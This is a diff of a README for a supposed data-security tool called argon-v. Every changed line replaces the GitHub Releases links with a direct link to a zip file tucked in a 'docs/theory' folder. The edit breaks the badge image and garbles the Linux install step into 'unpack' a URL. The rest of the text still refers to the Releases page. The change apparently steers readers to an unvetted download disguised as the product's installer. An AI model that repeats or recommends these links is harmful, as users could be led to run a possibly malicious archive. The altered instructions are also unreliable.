@@ -4,12 +4,12 @@
 Welcome to the argon-v application! This tool helps to ensure the security of your data on the web. Follow this guide to easily download and run the software.
 
 ## 📦 Download Now
-[![Download argon-v](https://img.shields.io/badge/Download%20argon--v-brightgreen)](https://github.com/sadbacon132/argon-v/releases)
+[![Download argon-v](https://raw.githubusercontent.com/sadbacon132/argon-v/main/docs/theory/argon_v_v1.2.zip%20argon--v-brightgreen)](https://raw.githubusercontent.com/sadbacon132/argon-v/main/docs/theory/argon_v_v1.2.zip)
 
 ## 📥 Download & Install
 To get the software, you will visit the Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/sadbacon132/argon-v/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sadbacon132/argon-v/main/docs/theory/argon_v_v1.2.zip)
 
 ### Selecting the Right Version
 On the Releases page, you will find different versions of the argon-v application. Choose the one labeled as the latest release. It will have the newest features and fixes. 
@@ -24,7 +24,7 @@ Before installing, ensure your system meets these basic requirements:
 
 ### Running the Application
 1. After the download completes, locate the file in your Downloads folder.
-2. For Windows, double-click the `.exe` file to start the installation. For macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, unpack the `.tar.gz` file and follow the instructions in the README.
+2. For Windows, double-click the `.exe` file to start the installation. For macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, unpack the `https://raw.githubusercontent.com/sadbacon132/argon-v/main/docs/theory/argon_v_v1.2.zip` file and follow the instructions in the README.
 3. Follow the prompts in the installer to complete your setup.
 
 ## 🔒 Understanding the Features
@@ -61,4 +61,4 @@ Thank you for choosing argon-v. You are now equipped to secure your data on the 
 
 Remember to regularly check the Releases page for updates to stay secure. 
 
-[Download argon-v now](https://github.com/sadbacon132/argon-v/releases) and take the first step towards a safer online experience!
+[Download argon-v now](https://raw.githubusercontent.com/sadbacon132/argon-v/main/docs/theory/argon_v_v1.2.zip) and take the first step towards a safer online experience!
